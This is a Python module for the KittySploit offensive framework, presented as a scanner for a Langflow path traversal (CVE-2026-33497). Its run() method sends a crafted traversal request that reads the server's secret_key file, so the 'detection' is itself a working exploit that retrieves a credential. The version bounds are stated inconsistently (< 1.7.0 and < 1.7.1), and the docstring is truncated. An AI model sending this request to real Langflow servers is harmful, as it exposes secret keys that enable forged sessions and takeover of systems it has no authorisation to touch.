#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Langflow < 1."""

from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Langflow < 1.7.0 - Path Traversal Detection',
        'description': 'Langflow < 1.7.1 contains a path traversal caused by insufficient filtering of folder_name and file_name parameters in download_profile_picture endpoint, letting attackers read secret_key across directories, exploit requires crafted request.',
        'author': ['KittySploit Team'],
        'severity': 'high',
        'tags': ['web', 'scanner', 'cve', 'cve2026', 'langflow', 'traversal'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': [],
            },
        },
        'references': [
            'https://github.com/langflow-ai/langflow/security/advisories/GHSA-ph9w-r52h-28p7',
            'https://nvd.nist.gov/vuln/detail/CVE-2026-33497',
        ],
        'cve': 'CVE-2026-33497',
    }

    def run(self):
        path = '/api/v1/files/profile_pictures/../secret_key'
        r = self.http_request(method='GET', path=path, allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        content_type = r.headers.get("Content-Type") or r.headers.get("content-type") or ""
        ctype_any = ('application/octet-stream',)
        if any(m in content_type for m in ctype_any):
            self.set_info(
                severity='high',
                reason='Langflow < 1.7.0 - Path Traversal detected',
                path=path,
            )
            return True
        return False

